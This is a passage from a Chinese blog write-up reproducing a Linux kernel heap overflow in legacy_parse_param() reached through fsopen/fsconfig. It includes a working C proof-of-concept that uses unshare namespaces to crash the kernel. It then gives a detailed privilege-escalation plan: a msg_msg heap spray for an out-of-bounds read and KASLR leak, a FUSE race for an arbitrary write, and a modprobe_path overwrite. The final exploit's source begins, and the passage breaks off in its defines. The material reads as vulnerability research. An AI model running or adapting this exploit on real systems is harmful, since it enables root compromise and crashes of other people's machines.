<code>init_fs_context</code>，因此最后都可以走到 <code>legacy_parse_param()</code> 的流程当中，例如 <code>ext4</code> 文件系统的 <code>file_system_type</code> 定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">file_system_type</span> <span class="hljs-title">ext4_fs_type</span> =</span> &#123;<br>.owner= THIS_MODULE,<br>.name= <span class="hljs-string">&quot;ext4&quot;</span>,<br>.mount= ext4_mount,<br>.kill_sb= kill_block_super,<br>.fs_flags= FS_REQUIRES_DEV,<br>&#125;;<br></code></pre></td></tr></table></figure><p>这里我们将通过 ext4 文件系统进行漏洞复现，我们只需要越界写足够长的一块内存，通常都能写到一些内核结构体从而导致 kernel panic</p><p>需要注意的是 filesystem mount API 需要命名空间具有  <code>CAP_SYS_ADMIN</code> 权限，但由于其<strong>仅检查命名空间权限</strong>，故对于没有该权限的用户则可以通过 <code>unshare(CLONE_NEWNS|CLONE_NEWUSER)</code> 创建新的命名空间，以在新的命名空间内获取对应权限</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE </span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsopen</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *fs_name, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsopen, fs_name, flags);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">fsconfig</span><span class="hljs-params">(<span class="hljs-type">int</span> fsfd, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, </span><br><span class="hljs-params">             <span class="hljs-type">const</span> <span class="hljs-type">char</span> *key, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *val, <span class="hljs-type">int</span> aux)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_fsconfig, fsfd, cmd, key, val, aux);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error: %s\033[0m\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span> fs_fd;<br><br>    <span class="hljs-comment">/* create new namespace to get CAP_SYS_ADMIN */</span><br>    unshare(CLONE_NEWNS | CLONE_NEWUSER);<br><br>    <span class="hljs-comment">/* get a filesystem context */</span><br>    fs_fd = fsopen(<span class="hljs-string">&quot;ext4&quot;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (fs_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;FAILED to fsopen()!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * fulfill the ctx-&gt;legacy_data to 4095 bytes, </span><br><span class="hljs-comment">     * so that the (PAGE_SIZE - 2 - size) overflow</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">255</span>; i++) &#123;<br>        fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-string">&quot;arttnba&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;pwnnn&quot;</span>, <span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* make an oob-write by fsconfig */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x4000</span>; i++) &#123;<br>        fsconfig(fs_fd, FSCONFIG_SET_STRING, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">0</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行，成功通过堆溢出造成 kernel panic：</p><p><img src="https://s2.loli.net/2023/01/08/KmX1LNFrDQPpd9u.png" alt="image.png"></p><h1>0x02.漏洞利用</h1><p>现在我们有了任意长度的堆溢出，而可溢出对象用的分配 flag 为 <code>GFP_KERNEL</code>、大小为 4k（一张内存页大小），那么我们不难想到可以基于<a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">我们的老朋友 System V 消息队列结构体</a>来完成利用</p><h2 id="Step-I-堆喷-msg-msg，覆写-m-ts-字段进行越界读取">Step.I - 堆喷 msg_msg，覆写 m_ts 字段进行越界读取</h2><p>我们先来复习一下消息队列中一条消息的基本结构，当我们调用 msgsnd 系统调用在指定消息队列上发送一条指定大小的 message 时，在内核空间中会创建这样一个结构体作为信息的 header：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* one msg_msg structure for each message */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">m_list</span>;</span><br><span class="hljs-type">long</span> m_type;<br><span class="hljs-type">size_t</span> m_ts;<span class="hljs-comment">/* message text size */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msgseg</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">void</span> *security;<br><span class="hljs-comment">/* the actual message follows immediately */</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>当我们在单个消息队列上发送一条消息时，若大小<strong>不大于【一个页面大小 - header size】</strong>，则仅使用一个 <code>msg_msg</code> 结构体进行存储，而当我们单次发送**大于【一个页面大小 - header size】**大小的消息时，内核会额外补充添加 <code>msg_msgseg</code> 结构体，其与 <code>msg_msg</code> 之间形成如下单向链表结构，而单个 <code>msg_msgseg</code> 的大小最大为一个页面大小，超出这个范围的消息内核会额外补充上更多的 <code>msg_msgseg</code> 结构体，链表最后以 NULL 结尾：</p><p><img src="https://s2.loli.net/2022/02/24/5IcVxRaFQtg3HCW.png" alt="image.png"></p><p>由于我们有越界写，那么我们不难想到的是我们可以将 <code>msg_msg</code> 与 <code>ctx-&gt;legacy_data</code> 堆喷到一起，之后越界写入相邻 <code>msg_msg</code> 的 header 将 <code>m_ts</code> 改大，之后我们再使用 <code>msgrcv()</code> 读取消息，便能读取出超出该消息范围的内容，从而完成越界读取；由于我们的越界写入会破坏 <code>msg_msg</code> 头部的双向链表，因此在读取时我们应当使用 <code>MSG_COPY</code> 以保持消息在队列上不会被 unlink</p><p>由于 <code>ctx-&gt;legacy_data</code> 的大小已经是 4k 了，故我们考虑在 <code>msg_msgseg</code> 上完成越界读取，由于 <code>msgrcv()</code> 拷贝消息时以单链表结尾 NULL 作为终止，故我们最多可以在 <code>msg_msgseg</code> 上读取将近一张内存页大小的数据，因此我们考虑让 <code>msg_msgseg</code> 的消息尽量小，从而让我们能够越界读取到更多的 object</p><p>接下来考虑如何使用越界读取进行数据泄露，这里我们考虑堆喷其他的可以泄露数据的小结构体与我们的 <code>msg_msgseg</code> 混在一起，从而使得我们越界读取时可以直接读到我们堆喷的这些小结构体，从而泄露出内核代码段加载基地址，那么这里笔者考虑堆喷 <a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x02-seq-file-%E7%9B%B8%E5%85%B3">seq_operations</a> 来完成数据的泄露</p><p>为了提高越界写入 <code>msg_msg</code> 的成功率，笔者选择先堆喷一部分 <code>msg_msg</code>，之后分配  <code>ctx-&gt;legacy_data</code> ， 接下来再堆喷另一部分 <code>msg_msg</code>为了提高数据泄露的成功概率，笔者选择在每次在消息队列上发送消息时都喷一个 <code>seq_operations</code>，在完成消息队列的发送之后再喷射大量的 <code>seq_operations</code></p><p>不过需要注意的是我们的越界写并不一定能写到相邻的 <code>msg_msg</code>，也可能写到其他结构体或是 free object，若 free object 的 next 指针刚好位于开头被我们 overwrite 了，则会在后面的分配中导致 kernel panic</p><h2 id="Step-II-堆喷-msg-msg，利用-FUSE-在消息拷贝时覆写-next-字段进行任意地址写">Step.II - 堆喷 msg_msg，利用 FUSE 在消息拷贝时覆写 next 字段进行任意地址写</h2><p>接下来我们该考虑如何进行提权的工作了，通过覆写 <code>msg_msg</code> 的方式我们同样可以进行任意地址写的操作，由于消息发送时在 <code>do_msgsnd()</code> 当中是先分配对应的 <code>msg_msg</code> 与 <code>msg_msgseg</code> 链表作为消息的存储空间再进行拷贝，那么我们不难想到的是我们可以先发送一个大于一张内存页大小的消息，这样会分配一个 4k 的 <code>msg_msg</code> 与一个 <code>msg_msgseg</code> ，在 <code>do_msgsnd()</code> 中完成空间分配后在 <code>msg_msg</code> 上进行数据拷贝的时候，我们在另一个线程当中使用越界写更改 <code>msg_msg</code> 的 header，使其 next 指针更改到我们想要写入数据的地方，当 <code>do_msgsnd()</code> 开始将数据拷贝到 <code>msg_msgseg</code> 上时，由于 <code>msg_msg</code> 的 next 指针已经被我们所更改，故其会将数据写入到我们指定的地址上，从而完成任意地址写</p><p><img src="https://s2.loli.net/2023/01/10/JxidQjuHn6ZKs4l.png" alt="image.png"></p><p>不过 <code>do_msgsnd()</code> 的所有操作在一个系统调用中完成，因此这需要我们进行条件竞争，而常规的条件竞争通常很难成功，那么我们不难想到的是我们可以利用 <a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#userfaultfd%EF%BC%88may-obsolete%EF%BC%89">userfaultfd</a> 让  <code>do_msgsnd()</code> 在拷贝数据到  <code>msg_msg</code>  时触发用户空间的缺页异常，陷入到我们的 page fault handler 中，我们在 handler 线程中再进行越界写，之后恢复到原线程，这样利用的成功率便大大提高了</p><p><img src="https://i.loli.net/2021/09/08/i4C7oOvHdG2RqUm.png" alt="image.png"></p><p>但是自 kernel 版本 5.11 起<strong>非特权用户无法使用 userfaultfd</strong>，而该漏洞影响的内核版本包括 5.11以上的版本，因此我们需要使用更为通用的办法——<strong>用户空间文件系统</strong>（filesystem in userspace，<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#FUSE-race">FUSE</a>）可以被用作 userfaultfd 的替代品，帮助我们完成条件竞争的利用</p><p><img src="https://s2.loli.net/2023/01/10/9q3VSGepCnKzbuB.png" alt="image.png"></p><p>不过需要注意的是，由于 slub allocator 的随机性，**我们并不能保证一定能够溢出到陷入 FUSE 中的 msg_msg ，**因此需要多次分配并进行检查以确保我们完成了任意地址写</p><p>有了任意地址写，现在该考虑写哪里、写什么了，我们可以通过覆写一些全局函数表来劫持内核执行流，或是覆写一些其他的东西完成提权，这里笔者选择覆写 <code>modprobe_path</code> 完成提权，当我们执行一个格式非法的程序时，内核会以 root 权限执行 <code>modprobe_path</code> 所指的应用，我们只需要将其改为我们的恶意脚本的路径即可</p><h2 id="FINAL-EXPLOIT">FINAL EXPLOIT</h2><p>最后由笔者编写的 exp 如下，因为一些原因暂时无法进行验证，但是思路应该是对的，在理论上应当可行：</p><blockquote><p>内核地址泄露的部分经过验证了，但是对于 FUSE 进行利用的部分，由于笔者在复现漏洞时使用的是 CTF 中 kernel pwn 的简易环境，故没法使用 FUSE：(</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FUSE_USE_VERSION 34</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/mount.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stddef.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fuse.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ipc.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/msg.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsopen</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsopen 430</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> __NR_fsconfig</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> __NR_fsconfig 431</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_SIZE 4096</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_SIZE 32</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TYPE <span class="hljs-string">&#x27;A&#x27;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRIMARY_MSG_TYPE    <span class="hljs-string">&#x27;A&#x27;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECONDARY_MSG_TYPE  <span class="hljs-string">&#x27;B&#x27;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VICTIM_MSG_TYPE     0x1337</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TAG     0xAAAAAAAA</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_QUEUE_NUM 0x10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SEQ_FILE_NUM 0x100</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_HOLE_SPACE 8</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_FILE_NAME <span class="hljs-string">&quot;a3fuse_evil_file&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_DAEMON_NAME <span class="hljs-string">&quot;evil_fuse&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_MOUNT_PATH <span class="hljs-string">&quot;/tmp/evil&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> EVIL_FILE_PATH EVIL_MOUNT_PATH <span 